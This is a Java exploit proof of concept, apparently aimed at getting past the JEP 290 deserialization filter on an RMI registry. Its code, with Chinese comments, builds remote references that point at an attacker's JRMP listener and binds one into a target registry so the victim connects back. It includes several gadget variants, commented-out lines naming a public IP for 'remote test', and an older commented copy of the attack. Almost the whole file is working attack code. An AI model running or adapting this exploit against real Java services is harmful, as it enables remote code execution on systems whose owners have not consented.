package com.lala;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

public class Bypass290 {

    public static class lala_remote implements Remote, java.io.Serializable {
        private RemoteRef ref;

        public lala_remote(UnicastRef remoteref) throws Throwable {
            ref=remoteref;
        }
    }

    //让受害者主动去连接的攻击者的JRMPlister的host和port
    public static UnicastRef generateUnicastRef(String host, int port) {
//        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
//        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
//        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
//        return new sun.rmi.server.UnicastRef(liveRef);
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        return new UnicastRef(new LiveRef(id, te, false));
    }

    public static void main(String[] args) throws Throwable {

        //获取UnicastRef对象
        String jrmpListenerHost = "127.0.0.1";//本地测试
//        String jrmpListenerHost = "47.102.137.160";//远程测试
        int jrmpListenerPort = 1199;
        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);

        //1.RemoteObjectInvocationHandler
            RemoteObjectInvocationHandler RemoteObjectInvocationHandler_obj = new RemoteObjectInvocationHandler(ref);
            //动态代理模式
            Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(), new Class[]{
                    Registry.class
            }, RemoteObjectInvocationHandler_obj);
        //2.RMIConnectionImpl_Stub
            RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = new RMIConnectionImpl_Stub(ref);
        //3.UnicastRemoteObject
            //3.1.获取到UnicastRemoteObject的实例
            Class clazz = Class.forName("java.rmi.server.UnicastRemoteObject");
            Constructor m = clazz.getDeclaredConstructor();
            m.setAccessible(true);
            UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();
            //3.2.修改实例的ref参数
            Reflections.setFieldValue(UnicastRemoteObject_obj,"ref",ref);
        //4.自定义
            lala_remote lala_remote_obj = new lala_remote(ref);
        //5.UnicastRemoteObject object(An Trinh)
            RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) ref);
            RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                    RMIServerSocketFactory.class.getClassLoader(),// classloader
                    new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
                    handler// RemoteObjectInvocationHandler
            );
            // UnicastRemoteObject constructor is protected. It needs to use reflections to new a object
            Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
            constructor.setAccessible(true);
            UnicastRemoteObject UnicastRemoteObject_obj_AnTrinh = (UnicastRemoteObject) constructor.newInstance(null);
            Reflections.setFieldValue(UnicastRemoteObject_obj_AnTrinh, "ssf", serverSocketFactory);

        //攻击目标
        Registry registry = LocateRegistry.getRegistry(1099);//本地测试
//        Registry registry = LocateRegistry.getRegistry("47.102.137.160",1099);//远程测试

        //尝试序列化到文件看transient的ref情况
//        FileOutputStream f = new FileOutputStream("payload.bin");
//        ObjectOutputStream fout = new ObjectOutputStream(f);
//        fout.writeObject(UnicastRemoteObject_obj);

        // 动态代理形式
//        registry.bind("hello", proxy);
        // 带UnicastRef类型参数的实现Remote接口的类
//        registry.bind("hello", RemoteObjectInvocationHandler_obj);
//        registry.bind("hello", RMIConnectionImpl_Stub_obj);
        registry.bind("hello", UnicastRemoteObject_obj_AnTrinh);
//        registry.bind("hello", RMIConnectionImpl_Stub_obj);
    }
}







//public class Bypass290 {
//        public static UnicastRef generateUnicastRef(String host, int port) {
//        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
//        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
//        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
//        return new sun.rmi.server.UnicastRef(liveRef);
//    }
//    public static void main(String[] args) throws Exception{
//        //获取UnicastRef对象
//        String jrmpListenerHost = "127.0.0.1";//本地测试
//        int jrmpListenerPort = 1199;
//        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);
//        //通过构造函数封装进入RemoteObjectInvocationHandler
//        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
//        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类
//        //所以接下来bind可以填入proxy
////        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),
////                new Class[]{Registry.class}, obj);
//        //触发漏洞
//        Registry registry = LocateRegistry.getRegistry(1099);//本地测试
////        registry.bind("hello", proxy);//填入payload
//        registry.bind("hello", obj);//填入payload
//    }
//}